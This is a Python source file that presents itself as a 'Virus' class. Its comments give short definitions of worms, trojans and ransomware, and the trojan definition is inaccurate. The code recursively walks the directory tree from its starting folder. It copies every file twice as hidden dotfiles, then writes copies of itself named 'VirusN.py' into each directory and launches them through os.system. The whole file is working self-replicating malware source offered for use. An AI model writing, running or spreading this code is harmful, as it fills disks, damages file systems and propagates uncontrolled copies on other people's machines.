import os       
import shutil   
import random   

# 1. Worms - Worms are viruses that, unlike traditional
# viruses, do not need the user's intervention to spread
# between devices, It usually spreads using replication

# 2. Trojans: A virus that targets machines or networks to
# spread itself.

# 3. Ransomware: During ransomware attacks, a user's
# files are encrypted and a ransom is demanded to
# regain access to them.

class Virus:    #Define the base class Virus
    
    def __init__(self, path=None, target_dir=None, repeat=None):    
        self.path = path                                    
        self.target_dir = []                                
        self.repeat = 2                                     
        self.own_path = os.path.realpath(__file__)          
          
    def list_directories(self,path):                        
        self.target_dir.append(path)                        
        current_dir = os.listdir(path)                      
        
        for file in current_dir:                           
            if not file.startswith('.'):                    
                absolute_path = os.path.join(path, file)    
                print(absolute_path)                        

                if os.path.isdir(absolute_path):            
                    self.list_directories(absolute_path)    
                else:                                       
                    pass
    

    def new_virus(self):   
        for directory in self.target_dir:
            n= random.randint(0 , 10)
            new_script="Virus"+str(n)+".py"
            destination = os.path.join(directory, new_script)
            shutil.copyfile(self.own_path, destination)
            os.system(new_script + " 1")
                   

    def replicate(self):
        for directory in self.target_dir:
            filelistindir = os.listdir(directory)
            for filename in filelistindir:
                absPath= os.path.join(directory, filename)
                if not absPath.startswith(".") and not os.path.isdir(absPath):
                    source = absPath
                    for i in range(self.repeat):
                        destination = os.path.join(directory, ("." + filename + str(i)))
                        shutil.copyfile(source , destination)


    def Virus_action(self):                 
        self.list_directories(self.path)
        print(self.target_dir)
        self.replicate()
        self.new_virus()





if __name__=="__main__":
    current_directory = os.path.abspath("") #Fetch the current directory in which Virus.py file is present
    Virus = Virus(path=current_directory)   #Defining Object Virus for class Virus and setting the attribute path to current directory
    Virus.Virus_action()                    #Accessing class attribute and method through objects